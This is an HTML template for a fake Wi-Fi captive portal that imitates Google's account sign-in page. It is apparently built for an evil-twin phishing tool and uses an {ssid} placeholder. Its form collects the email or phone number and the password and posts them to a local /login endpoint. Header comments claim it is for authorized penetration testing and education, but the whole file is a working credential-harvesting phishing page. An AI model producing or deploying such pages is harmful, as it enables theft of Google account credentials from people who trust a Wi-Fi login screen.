<!-- FOR AUTHORIZED WIRELESS AUDITING / PENETRATION TESTING ONLY -->
<!-- Google-inspired captive portal template — educational use only -->
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in - Google Accounts - {ssid}</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{font-family:"Google Sans","Roboto",Arial,sans-serif;background:#fff;color:#202124;min-height:100vh;display:flex;flex-direction:column}
  .wrap{flex:1;display:flex;align-items:center;justify-content:center;padding:24px}
  .card{width:100%;max-width:450px;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;display:flex;flex-direction:column;gap:0}
  .logo{margin:0 auto;display:flex;justify-content:center;align-items:center;gap:1px;font-size:22px;font-weight:500;letter-spacing:-0.5px}
  .logo span:nth-child(1){color:#4285f4}.logo span:nth-child(2){color:#ea4335}.logo span:nth-child(3){color:#fbbc05}.logo span:nth-child(4){color:#4285f4}.logo span:nth-child(5){color:#34a853}.logo span:nth-child(6){color:#ea4335}
  h1{font-size:24px;font-weight:400;text-align:center;margin:16px 0 8px}
  .sub{font-size:16px;font-weight:400;text-align:center;color:#202124;margin-bottom:30px}
  .net-badge{margin:0 auto 18px;background:#e8f0fe;border:1px solid #d2e3fc;color:#1967d2;font-size:12px;padding:6px 12px;border-radius:16px;display:inline-flex;align-items:center;gap:6px;max-width:100%;text-align:center}
  .net-badge svg{flex-shrink:0}
  .field{position:relative;margin-bottom:8px}
  .field input{width:100%;height:56px;padding:16px 14px 0;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none;transition:border-color .15s,box-shadow .15s;background:#fff}
  .field input:focus{border-color:#1a73e8;box-shadow:inset 0 0 0 1px #1a73e8}
  .field input.has-error{border-color:#d93025;box-shadow:inset 0 0 0 1px #d93025}
  .field label{position:absolute;left:12px;top:50%;transform:translateY(-50%);background:#fff;padding:0 4px;color:#5f6368;font-size:16px;pointer-events:none;transition:all .15s}
  .field input:focus + label,.field input:not(:placeholder-shown) + label{top:0;font-size:12px;color:#1a73e8}
  .field input.has-error + label{color:#d93025}
  .error{font-size:12px;color:#d93025;margin:6px 0 6px 2px;display:none}.error.show{display:block}
  .hint{font-size:14px;color:#1a73e8;margin:8px 0 28px;display:block;text-decoration:none;font-weight:500}
  .hint:hover{text-decoration:underline}
  .muted{font-size:14px;color:#5f6368;margin:0 0 20px;line-height:1.5}
  .muted a{color:#1a73e8;text-decoration:none;font-weight:500}
  .muted a:hover{text-decoration:underline}
  .actions{display:flex;justify-content:space-between;align-items:center;margin-top:28px}
  .link-btn{background:none;border:none;color:#1a73e8;font-size:14px;font-weight:500;cursor:pointer;padding:8px 0}
  .link-btn:hover{background:#f8f9ff;border-radius:4px;padding:8px 12px;margin:-8px -12px}
  .btn{height:36px;padding:0 24px;border:none;border-radius:4px;background:#1a73e8;color:#fff;font-size:14px;font-weight:500;cursor:pointer;letter-spacing:.25px;transition:background .15s,box-shadow .15s}
  .btn:hover{background:#1765cc;box-shadow:0 1px 2px rgba(60,64,67,.30),0 1px 3px 1px rgba(60,64,67,.15)}
  .btn:active{background:#185abc}
  .btn.loading{opacity:.75;pointer-events:none}
  .footer{padding:16px 24px;display:flex;justify-content:space-between;align-items:center;font-size:12px;color:#5f6368;flex-wrap:wrap;gap:8px;border-top:none}
  .footer select{border:none;color:#5f6368;background:#fff;font-size:12px}
  .footer a{color:#5f6368;text-decoration:none;margin-left:16px}
  .divider{height:1px;background:#dadce0;margin:24px 0 0}
  @media(max-width:600px){.card{border:none;padding:24px 24px 16px;max-width:100%}.wrap{padding:0;align-items:flex-start}.footer{padding:16px}}
</style>
</head>
<body>
<div class="wrap">
  <div class="card">
    <div class="logo" aria-label="Google"><span>G</span><span>o</span><span>o</span><span>g</span><span>l</span><span>e</span></div>
    <h1>Sign in</h1>
    <p class="sub">to continue to Google</p>

    <div class="net-badge" title="Captive portal for {ssid}">
      <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a10 10 0 0 0-9.95 9h11.64L9.74 7.05a5 5 0 0 1 5.67-2.07"/><path d="M12 22a10 10 0 0 0 9.95-9h-11.64L14.26 16.95a5 5 0 0 1-5.67 2.07"/></svg>
      Network: <strong>{ssid}</strong> &nbsp;·&nbsp; Wi-Fi authentication required
    </div>

    <form id="login-form" method="POST" action="/login" novalidate>
      <input type="hidden" name="ssid" value="{ssid}">
      <div class="field">
        <input id="email" name="username" type="email" placeholder=" " autocomplete="username" spellcheck="false" required autofocus>
        <label for="email">Email or phone</label>
      </div>
      <div class="error" id="err-email">Enter a valid email or phone number</div>
      <a class="hint" href="#" onclick="return false;">Forgot email?</a>

      <div class="field" style="margin-bottom:6px">
        <input id="password" name="password" type="password" placeholder=" " autocomplete="current-password" required>
        <label for="password">Enter your password</label>
      </div>
      <div class="error" id="err-pass">Enter a password</div>

      <div style="margin:10px 0 18px;display:flex;align-items:center;gap:8px">
        <input type="checkbox" id="show" onclick="togglePw()" style="width:15px;height:15px">
        <label for="show" style="font-size:14px;color:#202124;cursor:pointer;user-select:none">Show password</label>
      </div>

      <p class="muted">Not your computer? Use Guest mode to sign in privately. <a href="#" onclick="return false;">Learn more</a></p>

      <div class="actions">
        <button type="button" class="link-btn" onclick="return false;">Create account</button>
        <button type="submit" class="btn" id="btn">Next</button>
      </div>
    </form>
  </div>
</div>
<div class="divider"></div>
<div class="footer">
  <div style="display:flex;align-items:center;gap:8px"><select><option>English (United States)</option><option>Français</option><option>Español</option></select></div>
  <div><a href="#" onclick="return false;">Help</a><a href="#" onclick="return false;">Privacy</a><a href="#" onclick="return false;">Terms</a></div>
</div>
<script>
  function togglePw(){ const i=document.getElementById('password'); i.type=i.type==='password'?'text':'password'; }
  const form=document.getElementById('login-form');
  form.addEventListener('submit',function(e){
    const email=document.getElementById('email').value.trim();
    const pw=document.getElementById('password').value;
    let ok=true;
    document.getElementById('err-email').classList.remove('show');
    document.getElementById('err-pass').classList.remove('show');
    document.getElementById('email').classList.remove('has-error');
    document.getElementById('password').classList.remove('has-error');
    if(!email || (!/^[^\\s@]+@[^\\s@]+\\.[^\\s@]+$/.test(email) && !/^\\+?[0-9 ]{7,}$/.test(email))){
      document.getElementById('err-email').classList.add('show');
      document.getElementById('email').classList.add('has-error'); ok=false;
    }
    if(!pw){ document.getElementById('err-pass').classList.add('show'); document.getElementById('password').classList.add('has-error'); ok=false; }
    if(!ok){ e.preventDefault(); return; }
    const btn=document.getElementById('btn'); btn.textContent='Verifying…'; btn.classList.add('loading'); btn.disabled=true;
  });
  document.getElementById('email').addEventListener('input',()=>{ document.getElementById('email').classList.remove('has-error'); document.getElementById('err-email').classList.remove('show');});
  document.getElementById('password').addEventListener('input',()=>{ document.getElementById('password').classList.remove('has-error'); document.getElementById('err-pass').classList.remove('show');});
</script>
</body>
</html>
